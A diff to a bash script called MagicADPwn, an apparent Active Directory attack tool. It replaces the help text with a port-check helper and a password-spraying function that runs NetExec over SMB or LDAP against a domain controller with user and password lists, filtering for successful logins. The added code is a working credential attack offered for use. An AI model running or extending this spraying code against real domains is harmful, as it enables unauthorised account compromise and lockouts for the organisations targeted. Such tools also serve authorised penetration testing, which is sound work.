@@ -34,29 +34,43 @@ echo -e "${BLUE}==============================${RESET}"
 echo -e "${GREEN}       MagicADPwn v1.0       ${RESET}"
 echo -e "${BLUE}==============================${RESET}"
 
-# Usage function
-usage() {
-  echo "MagicADPwn - Automated AD Enumeration & Exploitation"
-  echo ""
-  echo "Usage: $0 -t <target_ip/hostname> [-u <username>] [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [--spray-users <file>] [--spray-passwords <file>] [-v]"
-  echo ""
-  echo "Required:"
-  echo "  -t, --target       Target Domain Controller IP/hostname"
-  echo ""
-  echo "Optional:"
-  echo "  -u, --user         Username (default: guest/anonymous)"
-  echo "  -p, --pass         Password"
-  echo "  -H, --hash         NTLM hash"
-  echo "  -k, --kerberos     Use Kerberos authentication"
-  echo "      --no-pass      Skip password/hash when using Kerberos"
-  echo "      --local-auth   Use local authentication"
-  echo "  --spray-users <file>   Supply a file with usernames for password spraying"
-  echo "  --spray-passwords <file>   Supply a file with passwords for password spraying"
-  echo "  --no-recon         Skip reconnaissance phase"
-  echo "  --report <format>  Generate report (json, csv, markdown, html)"
-  echo "  -v, --verbose      Enable verbose output"
-  echo ""
-  exit 0
+# Function to check if a port is open
+check_port() {
+  local target="$1"
+  local port="$2"
+  timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && return 0 || return 1
+}
+
+# Function for password spraying
+password_spray() {
+  local target="$1"
+  local users="$2"
+  local passwords="$3"
+  
+  echo -e "${GREEN}[INFO]${RESET} Checking available authentication services on $target..."
+  
+  if check_port "$target" 445; then
+    echo -e "${GREEN}[INFO]${RESET} SMB (port 445) is open. Using SMB for authentication attempts."
+    if [[ -n "$users" && -n "$passwords" ]]; then
+      nxc smb "$target" -u "$users" -p "$passwords" | grep [+]
+    elif [[ -n "$users" ]]; then
+      nxc smb "$target" -u "$users" -p "$PASSWORD" | grep [+]
+    elif [[ -n "$passwords" ]]; then
+      nxc smb "$target" -u "$USERNAME" -p "$passwords" | grep [+]
+    fi
+  elif check_port "$target" 389; then
+    echo -e "${GREEN}[INFO]${RESET} LDAP (port 389) is open. Using LDAP for authentication attempts."
+    if [[ -n "$users" && -n "$passwords" ]]; then
+      nxc ldap "$target" -u "$users" -p "$passwords" | grep [+]
+    elif [[ -n "$users" ]]; then
+      nxc ldap "$target" -u "$users" -p "$PASSWORD" | grep [+]
+    elif [[ -n "$passwords" ]]; then
+      nxc ldap "$target" -u "$USERNAME" -p "$passwords" | grep [+]
+    fi
+  else
+    echo -e "${RED}[ERROR]${RESET} Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
+    return 1
+  fi
 }
 
 # Ensure arguments are provided
@@ -146,17 +160,9 @@ if [[ -z "$TARGET" ]]; then
 fi
 
 # Determine authentication mode
-if [[ -n "$USERNAME" && -n "$PASSWORD" ]]; then
-  echo "Using provided username and password for authentication."
-elif [[ -n "$USERNAME" && -n "$SPRAY_PASSWORDS" ]]; then
-  echo "Performing password spraying with the provided username and password list."
-elif [[ -n "$PASSWORD" && -n "$SPRAY_USERS" ]]; then
-  echo "Performing password spraying with the provided user list and password."
-elif [[ -n "$SPRAY_USERS" && -n "$SPRAY_PASSWORDS" ]]; then
-  echo "Performing full password spraying with user and password lists."
-else
-  echo "No valid authentication method provided. Exiting."
-  exit 1
+if [[ -n "$SPRAY_USERS" || -n "$SPRAY_PASSWORDS" ]]; then
+  password_spray "$TARGET" "$SPRAY_USERS" "$SPRAY_PASSWORDS"
+  exit 0
 fi
 
 # Placeholder for main execution logic
